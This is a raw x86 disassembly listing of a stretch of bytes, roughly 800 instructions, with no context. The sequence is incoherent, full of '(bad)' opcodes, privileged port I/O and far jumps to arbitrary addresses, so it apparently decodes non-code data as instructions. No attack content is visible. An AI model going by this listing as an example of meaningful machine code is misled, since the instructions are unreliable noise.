  44c7b3:	in     al,dx
  44c7b4:	fstp   TBYTE PTR [edx-0x640da023]
  44c7ba:	or     ebx,DWORD PTR [ebx+ebp*4-0x4ce6d9ce]
  44c7c1:	push   ecx
  44c7c2:	or     eax,0xb97c0ef8
  44c7c7:	aam    0x2c
  44c7c9:	and    eax,0x14a509bf
  44c7ce:	sti    
  44c7cf:	out    0x9c,al
  44c7d1:	mov    al,ds:0x391cd8ae
  44c7d6:	call   0x6dd9e59b
  44c7db:	test   DWORD PTR [eax-0x5a],esp
  44c7de:	sti    
  44c7df:	sub    BYTE PTR [esi],bh
  44c7e1:	mov    cl,0x98
  44c7e3:	cmp    al,0xb4
  44c7e5:	xchg   edi,eax
  44c7e6:	scas   eax,DWORD PTR es:[edi]
  44c7e7:	or     esp,DWORD PTR [edx]
  44c7e9:	dec    ecx
  44c7ea:	stos   DWORD PTR es:[edi],eax
  44c7eb:	mov    esp,0x3d2b0945
  44c7f0:	cwde   
  44c7f1:	sahf   
  44c7f2:	stos   DWORD PTR es:[edi],eax
  44c7f3:	jae    0x44c866
  44c7f5:	std    
  44c7f6:	push   ds
  44c7f7:	loopne 0x44c780
  44c7f9:	sub    ebp,ecx
  44c7fb:	leave  
  44c7fc:	and    eax,0xae4c35a9
  44c801:	stc    
  44c802:	sbb    esi,edi
  44c804:	imul   DWORD PTR [eax+0x1a3258eb]
  44c80a:	dec    ecx
  44c80b:	push   ds
  44c80c:	xchg   ebx,eax
  44c80d:	xchg   ebp,eax
  44c80e:	inc    esp
  44c80f:	cmp    eax,0x3f0f91b
  44c814:	add    al,0xd8
  44c816:	mov    al,ds:0xd2a1f607
  44c81b:	xchg   edi,eax
  44c81c:	mov    ch,0xc2
  44c81e:	xchg   esp,eax
  44c81f:	jmp    0x44c7d2
  44c821:	repz or bl,BYTE PTR [ebx+0x11b2d992]
  44c828:	xor    esp,DWORD PTR [edi+0x3d]
  44c82b:	xrstors [esi+0x72968ab1]
  44c832:	and    al,0x1e
  44c834:	into   
  44c835:	sbb    BYTE PTR [ebx+0x479cf39b],al
  44c83b:	inc    edx
  44c83c:	push   esp
  44c83d:	mov    ecx,0x27fe5f7f
  44c842:	sub    eax,0xd622a089
  44c847:	inc    bh
  44c849:	popf   
  44c84a:	jnp    0x44c89f
  44c84c:	lods   eax,DWORD PTR ds:[esi]
  44c84d:	cli    
  44c84e:	ror    BYTE PTR [esp+ebx*8+0x19597532],1
  44c855:	(bad)  
  44c856:	mov    al,0xe4
  44c858:	sbb    DWORD PTR [edx],edx
  44c85a:	xlat   BYTE PTR ds:[ebx]
  44c85b:	iret   
  44c85c:	mov    ch,0x1
  44c85e:	loopne 0x44c84b
  44c860:	xchg   ebp,eax
  44c861:	mov    al,0xef
  44c863:	aaa    
  44c864:	mov    ecx,?
  44c866:	sbb    cl,BYTE PTR [edi]
  44c868:	into   
  44c869:	jnp    0x44c80e
  44c86b:	cmp    BYTE PTR [ecx],0x28
  44c86e:	mov    ah,0x2f
  44c870:	push   ss
  44c871:	push   esp
  44c872:	xor    eax,0xbb48ba38
  44c877:	cmp    DWORD PTR ds:[edi-0x4d],ebx
  44c87b:	and    BYTE PTR [ebp-0x3410d41b],al
  44c881:	imul   esp,ebx,0xfffffff6
  44c884:	and    DWORD PTR [ecx],ebx
  44c886:	push   edx
  44c887:	sub    esp,DWORD PTR [ebx+0xfe5c0ab]
  44c88d:	mov    dh,0xdb
  44c88f:	dec    ebp
  44c890:	test   ebp,esp
  44c892:	or     al,0x28
  44c894:	xchg   esi,eax
  44c895:	addr16 or ebx,ecx
  44c898:	mov    DWORD PTR [ecx],ebp
  44c89a:	cs sbb eax,0x6edd4df2
  44c8a0:	cdq    
  44c8a1:	mov    ebp,0xbfd590b6
  44c8a6:	cmp    bh,ah
  44c8a8:	adc    dh,BYTE PTR [edi+eiz*2]
  44c8ab:	add    eax,0x294b8932
  44c8b0:	imul   esi,ebx,0xc8f118cb
  44c8b6:	or     bl,BYTE PTR [ecx+0x40bbc074]
  44c8bc:	jbe    0x44c8bd
  44c8be:	sub    al,0x14
  44c8c0:	sbb    ecx,DWORD PTR [edi]
  44c8c2:	cmp    al,0xd0
  44c8c4:	sbb    cl,BYTE PTR [ecx+0x508b046f]
  44c8ca:	scas   al,BYTE PTR es:[edi]
  44c8cb:	out    dx,eax
  44c8cc:	test   DWORD PTR [edi+0x465e258b],esp
  44c8d2:	cli    
  44c8d3:	add    eax,0x6b682aa1
  44c8d8:	sub    eax,0x5b94b853
  44c8dd:	adc    ah,BYTE PTR [ebp+ebp*4-0x7293a95a]
  44c8e4:	mov    ebx,0x7d6bdc82
  44c8e9:	pushf  
  44c8ea:	imul   esp,edx,0xffffffbd
  44c8ed:	push   es
  44c8ee:	loope  0x44c92e
  44c8f0:	sbb    DWORD PTR [ecx],ecx
  44c8f2:	enter  0x9065,0x8
  44c8f6:	xchg   esp,eax
  44c8f7:	into   
  44c8f8:	adc    esp,DWORD PTR [edi-0x6dce1755]
  44c8fe:	sub    al,0xe
  44c900:	jns    0x44c954
  44c902:	or     DWORD PTR [ecx-0x1b1d7644],edx
  44c908:	and    eax,0x8e96d91e
  44c90d:	retf   
  44c90e:	mov    esi,DWORD PTR [ebx+0x56e177fb]
  44c914:	out    dx,eax
  44c915:	gs popf 
  44c917:	mov    eax,0x549bb6ab
  44c91c:	jl     0x44c8de
  44c91e:	cmp    DWORD PTR [di],esp
  44c921:	xchg   ebp,eax
  44c922:	scas   eax,DWORD PTR es:[edi]
  44c923:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44c924:	mov    bh,0xdf
  44c926:	jp     0x44c98e
  44c928:	add    al,0x6a
  44c92a:	mov    bh,0x74
  44c92c:	outs   dx,BYTE PTR ds:[esi]
  44c92d:	fwait
  44c92e:	stos   DWORD PTR es:[edi],eax
  44c92f:	aas    
  44c930:	push   ss
  44c931:	fstp   QWORD PTR [edi-0x17]
  44c934:	leave  
  44c935:	xchg   esp,eax
  44c936:	sahf   
  44c937:	scas   eax,DWORD PTR es:[edi]
  44c938:	rcr    BYTE PTR [edi],cl
  44c93a:	mov    ah,0xd4
  44c93c:	das    
  44c93d:	fisttp QWORD PTR [ebp+0xb]
  44c940:	lds    esi,FWORD PTR [esi+0x3d44f10a]
  44c946:	sub    eax,0x90da08be
  44c94b:	xchg   ebp,eax
  44c94c:	test   eax,0xf8e6779a
  44c951:	or     edi,DWORD PTR ds:0xf456c5df
  44c957:	in     al,0x6f
  44c959:	or     al,0x81
  44c95b:	and    eax,0xcc948e9e
  44c960:	test   DWORD PTR [ebp+0x2ffe7a2],ebx
  44c966:	es imul esi,esi,0xffffffe8
  44c96a:	or     DWORD PTR [ebx+0x50b5f121],eax
  44c970:	and    DWORD PTR [eax-0x1e],ebp
  44c973:	es inc edi
  44c975:	jmp    0x27040e5c
  44c97a:	fist   DWORD PTR [ecx-0x75]
  44c97d:	push   ss
  44c97e:	jl     0x44c9e6
  44c980:	fcomip st,st(0)
  44c982:	ficom  WORD PTR [esi+ecx*8]
  44c985:	add    al,0xd2
  44c987:	(bad)  
  44c988:	shl    dl,cl
  44c98a:	mov    esi,0xaa3cf3a5
  44c98f:	aad    0xc1
  44c991:	imul   edi,eax,0xdf761ce5
  44c997:	call   0xc8b1f495
  44c99c:	mov    ecx,0xa6fc952e
  44c9a1:	fldcw  WORD PTR [ecx]
  44c9a3:	setp   BYTE PTR [esi+0x8]
  44c9a7:	in     eax,dx
  44c9a8:	jne    0x44c9c5
  44c9aa:	mov    bh,ah
  44c9ac:	lods   eax,DWORD PTR ds:[esi]
  44c9ad:	ficomp WORD PTR [esi+0x15aff5ee]
  44c9b3:	out    dx,al
  44c9b4:	int3   
  44c9b5:	jne    0x44c972
  44c9b7:	addr16 sbb eax,0x920932a9
  44c9bd:	sti    
  44c9be:	add    DWORD PTR [edx],edx
  44c9c0:	and    BYTE PTR [edx+0x74956ffb],0x46
  44c9c7:	jecxz  0x44c960
  44c9c9:	test   al,0x6a
  44c9cb:	or     DWORD PTR [esi],0x1e350bd5
  44c9d1:	aad    0x82
  44c9d3:	mov    ds:0x5ba40a,eax
  44c9d8:	cmp    al,0xd5
  44c9da:	jle    0x44ca1c
  44c9dc:	xor    eax,0x7fa633a5
  44c9e1:	fdivr  DWORD PTR [ebp+0x6a9ddf44]
  44c9e7:	iret   
  44c9e8:	sub    DWORD PTR [ecx+0x5711b2c4],ebp
  44c9ee:	mov    ah,0x74
  44c9f0:	adc    bh,0x2b
  44c9f3:	pusha  
  44c9f4:	scas   al,BYTE PTR es:[edi]
  44c9f5:	daa    
  44c9f6:	jge    0x44ca2f
  44c9f8:	in     eax,dx
  44c9f9:	jne    0x44ca77
  44c9fb:	call   0xdb015eaf
  44ca00:	cmc    
  44ca01:	mov    ch,0x66
  44ca03:	out    0xb3,al
  44ca05:	push   es
  44ca06:	pushf  
  44ca07:	jb     0x44ca2e
  44ca09:	or     DWORD PTR [esi],edi
  44ca0b:	add    DWORD PTR [ecx-0x50],esi
  44ca0e:	xlat   BYTE PTR ds:[ebx]
  44ca0f:	and    BYTE PTR [edx],bl
  44ca11:	mov    ebx,DWORD PTR [edx+eiz*1+0x8]
  44ca15:	or     eax,0xb20db4e1
  44ca1a:	lods   al,BYTE PTR ds:[esi]
  44ca1b:	int    0xf0
  44ca1d:	popf   
  44ca1e:	sub    ebp,ebp
  44ca20:	dec    ebp
  44ca21:	sti    
  44ca22:	or     ebp,DWORD PTR [edx-0x5a]
  44ca25:	jmp    0x523e9edf
  44ca2a:	mov    bl,0x95
  44ca2c:	rol    BYTE PTR gs:[ebx+0x1e9d1ae8],1
  44ca33:	leave  
  44ca34:	xchg   ebp,eax
  44ca35:	sub    DWORD PTR [ebx],ebx
  44ca37:	push   edi
  44ca38:	sub    al,0x5f
  44ca3a:	sbb    cl,BYTE PTR [edx+0x7ccf8581]
  44ca40:	stc    
  44ca41:	jle    0x44ca00
  44ca43:	fimul  DWORD PTR [eax-0x5a]
  44ca46:	retf   
  44ca47:	ins    DWORD PTR es:[edi],dx
  44ca48:	jp     0x44cab6
  44ca4a:	push   cs
  44ca4b:	mov    ebp,0x4a24191d
  44ca50:	outs   dx,BYTE PTR ds:[esi]
  44ca51:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44ca52:	mov    DWORD PTR [edx+0x4c],edx
  44ca55:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44ca56:	dec    ebx
  44ca57:	outs   dx,DWORD PTR ds:[esi]
  44ca58:	fwait
  44ca59:	or     dl,BYTE PTR [ebx]
  44ca5b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44ca5c:	xchg   DWORD PTR [edi+0x21],eax
  44ca5f:	shl    DWORD PTR [ebp+0x5084be02],0xdf
  44ca66:	push   cs
  44ca67:	enter  0x8d95,0xa0
  44ca6b:	jmp    0x44ca39
  44ca6d:	int3   
  44ca6e:	or     eax,0xc2493401
  44ca73:	dec    eax
  44ca74:	adc    BYTE PTR [ecx-0x59e34c63],ch
  44ca7a:	dec    esp
  44ca7b:	pop    ss
  44ca7c:	gs dec eax
  44ca7e:	lods   al,BYTE PTR ds:[esi]
  44ca7f:	test   DWORD PTR [eax+0x74c5d914],0x862f5bb3
  44ca89:	ins    DWORD PTR es:[edi],dx
  44ca8a:	mov    bl,0x54
  44ca8c:	pop    edi
  44ca8d:	shl    BYTE PTR [ecx-0x46a49a4f],1
  44ca93:	out    0xd3,eax
  44ca95:	fs push ebx
  44ca97:	mul    DWORD PTR [ecx]
  44ca99:	mov    ecx,0x3564c9a1
  44ca9e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44ca9f:	push   ebx
  44caa0:	scas   eax,DWORD PTR es:[edi]
  44caa1:	mov    esp,gs
  44caa3:	add    eax,0x7440e360
  44caa8:	adc    eax,0x72e9d0be
  44caad:	test   eax,0x2502d046
  44cab2:	mov    ebp,0x4d706834
  44cab7:	js     0x44cae4
  44cab9:	loop   0x44caeb
  44cabb:	addr16 adc al,dh
  44cabe:	mov    ebp,0xe70a3144
  44cac3:	aad    0xa8
  44cac5:	inc    ebx
  44cac6:	retf   
  44cac7:	test   bh,bh
  44cac9:	arpl   WORD PTR [edx-0x47],dx
  44cacc:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44cace:	sti    
  44cacf:	xor    dl,BYTE PTR [esi]
  44cad1:	jb     0x44cb23
  44cad3:	inc    esi
  44cad4:	xchg   esp,eax
  44cad5:	(bad)
  44cad8:	ins    DWORD PTR es:[edi],dx
  44cad9:	xchg   esp,eax
  44cada:	mov    eax,0x8c8001c4
  44cadf:	loope  0x44cb26
  44cae1:	mov    ds:0xcedfae3b,al
  44cae6:	loop   0x44cb0c
  44cae8:	mov    ecx,0x6b2328e1
  44caed:	stos   DWORD PTR es:[edi],eax
  44caee:	mov    cl,0x94
  44caf0:	ss scas al,BYTE PTR es:[edi]
  44caf2:	test   dh,cl
  44caf4:	lds    eax,FWORD PTR [esi+0x6398eba2]
  44cafa:	cli    
  44cafb:	mov    al,0xbb
  44cafd:	mov    esp,0x53fdbf63
  44cb02:	mov    al,ds:0xec9f35e8
  44cb07:	mov    ch,0xe9
  44cb09:	pop    ebp
  44cb0a:	push   ds
  44cb0b:	mov    ah,0x30
  44cb0d:	ins    BYTE PTR es:[edi],dx
  44cb0e:	mov    bl,0x14
  44cb10:	imul   BYTE PTR ss:[ebx-0x441c8342]
  44cb17:	fs mov bl,0x9a
  44cb1a:	hlt    
  44cb1b:	add    ch,dh
  44cb1d:	adc    al,0x36
  44cb1f:	repnz xchg ecx,eax
  44cb21:	cmp    DWORD PTR [edi+eax*4],edi
  44cb24:	and    eax,0x19085ba9
  44cb29:	mov    esi,0x136cfa24
  44cb2e:	pop    esp
  44cb2f:	add    bh,BYTE PTR [esi]
  44cb31:	dec    ecx
  44cb32:	test   BYTE PTR [edx-0xafbd0ed],dl
  44cb38:	and    BYTE PTR [esi+edx*1-0x17],0xba
  44cb3d:	inc    eax
  44cb3e:	cdq    
  44cb3f:	mov    es:0xe7d4bf89,al
  44cb45:	sbb    eax,0x791885a0
  44cb4a:	fcomp  st(2)
  44cb4c:	sti    
  44cb4d:	ss jae 0x44cb2d
  44cb50:	sbb    ecx,DWORD PTR [ecx+0x4e]
  44cb53:	cmp    DWORD PTR [eax],0x8
  44cb56:	jge    0x44cb3e
  44cb58:	cmp    bl,BYTE PTR [esi-0x27a9e25]
  44cb5e:	enter  0x2814,0xb5
  44cb62:	xchg   esi,eax
  44cb63:	sbb    al,0x1a
  44cb65:	mov    ecx,0x4a84c036
  44cb6a:	std    
  44cb6b:	adc    al,0x63
  44cb6d:	call   0x3152:0x85ec920b
  44cb74:	outs   dx,BYTE PTR ds:[esi]
  44cb75:	add    al,0xf2
  44cb77:	test   al,0x24
  44cb79:	mov    eax,ds:0xd8bdc88b
  44cb7e:	or     bh,ch
  44cb80:	in     al,0x2d
  44cb82:	add    esp,ecx
  44cb84:	cmc    
  44cb85:	pusha  
  44cb86:	outs   dx,DWORD PTR ds:[esi]
  44cb87:	out    0x5a,al
  44cb89:	or     DWORD PTR [edi+0x617947ea],ecx
  44cb8f:	push   eax
  44cb90:	call   0x94937e44
  44cb95:	test   ax,0x166a
  44cb99:	fs repnz pop edx
  44cb9c:	xchg   esp,eax
  44cb9d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44cb9e:	sbb    esp,DWORD PTR [ecx+0x6f]
  44cba1:	mov    esp,0xa0fab3c2
  44cba6:	mov    ah,0x34
  44cba8:	jmp    0x44cb36
  44cbaa:	pop    esp
  44cbab:	jo     0x44cc22
  44cbad:	xchg   ebx,eax
  44cbae:	mov    ch,0xf0
  44cbb0:	in     eax,dx
  44cbb1:	fild   QWORD PTR [eax+ebp*1+0x278d1920]
  44cbb8:	push   ebp
  44cbb9:	aas    
  44cbba:	xchg   ecx,eax
  44cbbb:	test   BYTE PTR [eax-0x5f],ah
  44cbbe:	sti    
  44cbbf:	mov    bh,0x2d
  44cbc1:	imul   esp,DWORD PTR ds:[ebx],0x352b06db
  44cbc8:	mov    ah,0xfb
  44cbca:	mov    ebp,0x3b8740e4
  44cbcf:	test   eax,0xe11e87a9
  44cbd4:	aaa    
  44cbd5:	jg     0x44cb87
  44cbd7:	adc    al,0xf1
  44cbd9:	inc    edx
  44cbda:	fild   WORD PTR [esp+edx*8+0x5c]
  44cbde:	mov    esi,0xa764d594
  44cbe3:	sbb    edx,DWORD PTR ds:0xdef18373
  44cbe9:	cmp    bh,BYTE PTR [eax-0x7f]
  44cbec:	sub    eax,0xb91f3ea9
  44cbf1:	vmwrite ebp,DWORD PTR [edi-0x35e13add]
  44cbf8:	push   ebp
  44cbf9:	adc    edx,DWORD PTR ds:0xd6397aec
  44cbff:	sbb    al,0x1d
  44cc01:	or     DWORD PTR [esi],edi
  44cc03:	jg     0x44cc84
  44cc05:	cwde   
  44cc06:	into   
  44cc07:	push   ss
  44cc08:	sbb    DWORD PTR [edi+0x5ef42c2b],ebx
  44cc0e:	sbb    DWORD PTR [esi-0x49b3c9aa],ecx
  44cc14:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44cc15:	mov    ?,WORD PTR [eax+0x7edfe204]
  44cc1b:	pushf  
  44cc1c:	mov    ch,0x74
  44cc1e:	push   eax
  44cc1f:	out    dx,al
  44cc20:	out    0x43,al
  44cc22:	cmp    ebp,DWORD PTR [eax-0x5fcc76dc]
  44cc28:	cmp    BYTE PTR [ebx-0x66852ecf],dl
  44cc2e:	or     edi,DWORD PTR [ebp+0x25]
  44cc31:	cli    
  44cc32:	mov    bl,0x50
  44cc34:	(bad)  
  44cc35:	cli    
  44cc36:	push   ecx
  44cc37:	in     eax,dx
  44cc38:	or     al,0x47
  44cc3a:	mov    al,0x14
  44cc3c:	mov    ebp,0xd51437e5
  44cc41:	xchg   DWORD PTR [ecx-0x1b],esp
  44cc44:	mov    ah,0xab
  44cc46:	loop   0x44cc13
  44cc48:	sub    BYTE PTR [ecx+0x2f],bh
  44cc4b:	sub    BYTE PTR [edx-0x66],bl
  44cc4e:	sbb    BYTE PTR [edi],dh
  44cc50:	sub    al,0xdd
  44cc52:	fisub  DWORD PTR fs:[ebp-0x3a96d10a]
  44cc59:	add    bh,0xea
  44cc5c:	ds cmp al,0xe8
  44cc5f:	aad    0x22
  44cc61:	imul   ebp,DWORD PTR [ebx],0xdf6ad8f8
  44cc67:	jge    0x44cc7e
  44cc69:	mov    al,0xeb
  44cc6b:	dec    eax
  44cc6c:	in     eax,dx
  44cc6d:	sub    eax,0xa1f024e0
  44cc72:	xchg   edx,eax
  44cc73:	cwde   
  44cc74:	pop    ds
  44cc75:	fldpi  
  44cc77:	lock pop eax
  44cc79:	repnz iret 
  44cc7b:	xor    dl,BYTE PTR [edx+ebx*4-0x61814bc5]
  44cc82:	sbb    DWORD PTR [edx+0xf],0x70
  44cc86:	inc    esp
  44cc87:	test   eax,0xe4be57ef
  44cc8c:	sbb    eax,DWORD PTR [eax+0x59]
  44cc8f:	sbb    al,ch
  44cc91:	outs   dx,BYTE PTR ds:[esi]
  44cc92:	xchg   edx,eax
  44cc93:	in     eax,0xcd
  44cc95:	xor    al,0x2b
  44cc97:	in     eax,dx
  44cc98:	sbb    ch,cl
  44cc9a:	rcr    DWORD PTR [edx-0x72],0x98
  44cc9e:	or     al,0x8f
  44cca0:	icebp  
  44cca1:	inc    eax
  44cca2:	jb     0xed4b5e03
  44cca8:	nop
  44cca9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44ccaa:	xchg   DWORD PTR [ebp+0x1b5deba3],esp
  44ccb0:	mov    bl,0xbf
  44ccb2:	test   DWORD PTR cs:[ebx],ebx
  44ccb5:	jmp    0xc6ac:0xc253ac82
  44ccbc:	jecxz  0x44cc60
  44ccbe:	or     edi,ecx
  44ccc0:	leave  
  44ccc1:	sbb    al,0xbd
  44ccc3:	gs push ss
  44ccc5:	jmp    0xf155ae2a
  44ccca:	jl     0x44ccfc
  44cccc:	and    DWORD PTR [ecx],0xffffffa5
  44cccf:	dec    ecx
  44ccd0:	(bad)  
  44ccd1:	aas    
  44ccd2:	mov    ah,0x57
  44ccd4:	mov    ds:0x54ee6e99,eax
  44ccd9:	(bad)  
  44ccda:	int3   
  44ccdb:	js     0x44ccf7
  44ccdd:	push   0x4d2064bb
  44cce2:	mov    ds:0xf08a75bd,al
  44cce7:	call   0xd5226ae0
  44ccec:	push   esp
  44cced:	sbb    DWORD PTR [ebp+0x4830a591],esp
  44ccf3:	fiadd  WORD PTR ds:[esi-0x3eba9538]
  44ccfa:	adc    ah,bh
  44ccfc:	jns    0x44ccdb
  44ccfe:	cmp    ah,dl
  44cd00:	sbb    al,0x29
  44cd02:	ja     0x44cd18
  44cd04:	sub    DWORD PTR [ecx+ebx*2-0x5d],ecx
  44cd08:	push   cs
  44cd09:	test   eax,0xeed668eb
  44cd0e:	or     ecx,DWORD PTR [eax-0x27]
  44cd11:	test   eax,0x94845ab5
  44cd16:	xor    al,0x8
  44cd18:	ja     0x44cceb
  44cd1a:	addr16 dec eax
  44cd1c:	icebp  
  44cd1d:	and    BYTE PTR [ebp+ebp*4-0x34d06846],dl
  44cd24:	push   0xc008ba8
  44cd29:	mov    esi,0x9298c961
  44cd2e:	outs   dx,DWORD PTR ds:[esi]
  44cd2f:	pop    edi
  44cd30:	imul   ecx,esp,0xffffffb9
  44cd33:	test   dh,bh
  44cd35:	rol    edi,0x7d
  44cd38:	aad    0xc0
  44cd3a:	or     ecx,esi
  44cd3c:	dec    edx
  44cd3d:	call   DWORD PTR [ebx-0x566e9cf]
  44cd43:	pusha  
  44cd44:	lock jmp 0x6b236217
  44cd4a:	scas   eax,DWORD PTR es:[edi]
  44cd4b:	xchg   ebp,eax
  44cd4c:	sbb    BYTE PTR [ecx],ch
  44cd4e:	dec    eax
  44cd4f:	das    
  44cd50:	mov    dh,BYTE PTR [edi-0x1e]
  44cd53:	cmc    
  44cd54:	xchg   ebp,eax
  44cd55:	cmp    DWORD PTR [esi+0x23],edi
  44cd58:	jmp    0x44cda6
  44cd5a:	push   cs
  44cd5b:	into   
  44cd5c:	add    eax,0xa58ab347
  44cd61:	cs push ss
  44cd63:	jmp    0x2dbc13f0
  44cd68:	(bad)  
  44cd69:	ins    BYTE PTR es:[edi],dx
  44cd6a:	jns    0x44cd2b
  44cd6c:	xchg   ebp,eax
  44cd6d:	rol    dl,1
  44cd6f:	icebp  
  44cd70:	inc    eax
  44cd71:	pop    ebp
  44cd72:	xor    dl,BYTE PTR [esi+0x64960186]
  44cd78:	dec    ecx
  44cd79:	mov    eax,ds:0xf17cb526
  44cd7e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44cd7f:	out    dx,al
  44cd80:	inc    edi
  44cd81:	jns    0x44cd42
  44cd83:	and    al,0x9a
  44cd85:	or     al,0x8e
  44cd87:	in     al,0x45
  44cd89:	xor    edi,DWORD PTR [eax]
  44cd8b:	icebp  
  44cd8c:	jg     0x44cd67
  44cd8e:	dec    edi
  44cd8f:	mov    ah,0x27
  44cd91:	leave  
  44cd92:	sbb    BYTE PTR ds:0xa8ea1759,cl
  44cd98:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44cd99:	(bad)  
  44cd9a:	arpl   WORD PTR [esi+edx*2-0x40cd2abd],ax
  44cda1:	or     ecx,eax
  44cda3:	sub    ebp,DWORD PTR [ecx+0x1aedca61]
  44cda9:	stc    
  44cdaa:	sub    ecx,ebp
  44cdac:	jl     0x44cdda
  44cdae:	dec    ebp
  44cdaf:	push   edx
  44cdb0:	pop    esp
  44cdb1:	pop    esi
  44cdb2:	stos   DWORD PTR es:[edi],eax
  44cdb3:	and    DWORD PTR [esi+ebx*4-0x15999215],eax
  44cdba:	cmp    DWORD PTR [ebp-0x72],ebx
  44cdbd:	lods   al,BYTE PTR ds:[esi]
  44cdbe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44cdbf:	and    al,0x7b
  44cdc1:	arpl   bx,cx
  44cdc3:	in     al,0x85
  44cdc5:	test   dh,ah
  44cdc7:	and    eax,0x11fbab49
  44cdcc:	and    edx,eax
  44cdce:	xchg   edx,eax
  44cdcf:	sub    bh,BYTE PTR ds:0x1bff5928
  44cdd5:	leave  
  44cdd6:	xchg   esi,eax
  44cdd7:	fld    DWORD PTR [eax]
  44cdd9:	push   0x34
  44cddb:	mov    edi,0xf02bc78c
  44cde0:	ins    BYTE PTR es:[edi],dx
  44cde1:	test   DWORD PTR [eax+0x25314637],ebp
  44cde7:	add    dh,BYTE PTR [eax]
  44cde9:	ja     0x44ce44
  44cdeb:	in     eax,0x14
  44cded:	repnz shr ebx,cl
  44cdf0:	loopne 0x44cddc
  44cdf2:	mov    al,0xbd
  44cdf4:	sti    
  44cdf5:	xchg   ebx,eax
  44cdf6:	mov    esi,0xe1b4c2b3
  44cdfb:	je     0x44cdac
  44cdfd:	repnz lods al,BYTE PTR ds:[esi]
  44cdff:	hlt    
  44ce00:	add    eax,0x59fe2cd6
  44ce05:	jge    0x44ce7f
  44ce07:	mov    eax,DWORD PTR [ecx+0x47f25057]
  44ce0d:	push   edi
  44ce0e:	xchg   ecx,eax
  44ce0f:	out    0x25,eax
  44ce11:	push   ss
  44ce12:	dec    esp
  44ce13:	call   0xa25678a1
  44ce18:	cmc    
  44ce19:	mov    ds:0xfb40e6e1,eax
  44ce1e:	iret   
  44ce1f:	jle    0x44cdc1
  44ce21:	sbb    al,BYTE PTR [ebx]
  44ce23:	mov    edi,0xd33ae656
  44ce28:	sbb    eax,0xffb52ba1
  44ce2d:	adc    DWORD PTR ds:0xe780a6b0,0x89b58116
  44ce37:	out    dx,al
  44ce38:	rcl    BYTE PTR gs:[esi+0x5954dbe7],cl
  44ce3f:	push   0x24
  44ce41:	cdq    
  44ce42:	cs pop esp
  44ce44:	sbb    eax,0xecc22601
  44ce49:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44ce4a:	pop    ebx
  44ce4b:	bound  eax,QWORD PTR [esi]
  44ce4d:	cmp    esi,edx
  44ce4f:	jmp    0x5d1f:0x773c73a0
  44ce56:	mov    eax,0x27ed47b4
  44ce5b:	daa    
  44ce5c:	xchg   ebp,eax
  44ce5d:	inc    BYTE PTR [ebp-0x10]
  44ce60:	xchg   esi,eax
  44ce61:	popf   
  44ce62:	jns    0x44ceae
  44ce64:	push   ds
  44ce65:	cmp    DWORD PTR [ebx+0x7f],edx
  44ce68:	test   esp,ecx
  44ce6a:	push   ebp
  44ce6b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44ce6c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44ce6d:	push   eax
  44ce6e:	lods   al,BYTE PTR ds:[esi]
  44ce6f:	pop    edi
  44ce70:	je     0x44ce60
  44ce72:	mov    dh,0xb7
  44ce74:	mov    ecx,0xa544d513
  44ce79:	jle    0x44ce32
  44ce7b:	or     BYTE PTR [edx],bl
  44ce7d:	mov    ecx,0x5072e493
  44ce82:	mov    ebx,0xff881830
  44ce87:	in     eax,0xb8
  44ce89:	in     al,dx
  44ce8a:	ds and al,0x30
  44ce8d:	fs mov ecx,0x4c91bb5c
  44ce93:	rcr    DWORD PTR [edx],1
  44ce95:	(bad)  
  44ce96:	scas   eax,DWORD PTR es:[edi]
  44ce97:	or     DWORD PTR gs:[ebx+0xa],0x7b9fd2f3
  44ce9f:	test   DWORD PTR [edi-0x510dac5c],ebp
  44cea5:	call   FWORD PTR [edi*8+0x14bd32bf]
  44ceac:	ss int 0x5
  44ceaf:	jp     0x44cf06
  44ceb1:	pusha  
  44ceb2:	shr    bh,cl
  44ceb4:	add    eax,0xf83c5e7a
  44ceb9:	mov    DWORD PTR [ecx-0x7c],eax
  44cebc:	mov    edi,0x34a969d3
  44cec1:	push   ds
  44cec2:	pop    eax
  44cec3:	add    al,0x64
  44cec5:	mov    al,ds:0xe2f7542b
  44ceca:	mov    WORD PTR [edi+0xa749084],cs
  44ced0:	or     eax,0xdb84bc7a
  44ced5:	jmp    0xbab:0xa1e4c5e2
  44cedc:	dec    eax
  44cedd:	push   ecx
  44cede:	push   esi
  44cedf:	xor    bl,BYTE PTR [eax]
  44cee1:	pop    edx
  44cee2:	pop    esp
  44cee3:	fild   QWORD PTR [eax+0x5364bbdc]
  44cee9:	nop
  44ceea:	mov    esp,0x4b9f9d22
  44ceef:	fmul   st(1),st
  44cef1:	std    
  44cef2:	mov    ebx,0x64366637
  44cef7:	into   
  44cef8:	jp     0x44cf62
  44cefa:	sahf   
  44cefb:	push   ebx
  44cefc:	adc    esp,DWORD PTR [edi-0x39]
  44ceff:	je     0x44cf1f
  44cf01:	mov    dl,0x2d
  44cf03:	scas   al,BYTE PTR es:[edi]
  44cf04:	outs   dx,BYTE PTR ds:[esi]
  44cf05:	call   0xea5a:0xdecb9bbb
  44cf0c:	lea    ebx,[ebp+0x2edfc25d]
  44cf12:	mov    bl,0xf4
  44cf14:	xor    eax,0x65f5b95b
  44cf19:	fisttp WORD PTR ds:0x5525b5e6
  44cf1f:	(bad)  
  44cf20:	and    al,0xf9
  44cf22:	pop    ds
  44cf23:	aad    0xb3
  44cf25:	fisubr DWORD PTR [esi]
  44cf27:	js     0x44cf94
  44cf29:	mov    ds:0xf633dadb,eax
  44cf2e:	mov    es,WORD PTR [esi+0x6aed68af]
  44cf34:	iret   
  44cf35:	push   edi
  44cf36:	mov    al,0x94
  44cf38:	add    eax,0xf7ba259a
  44cf3d:	rol    BYTE PTR [eax],0xda
  44cf40:	inc    ebp
  44cf41:	mov    ch,0xd4
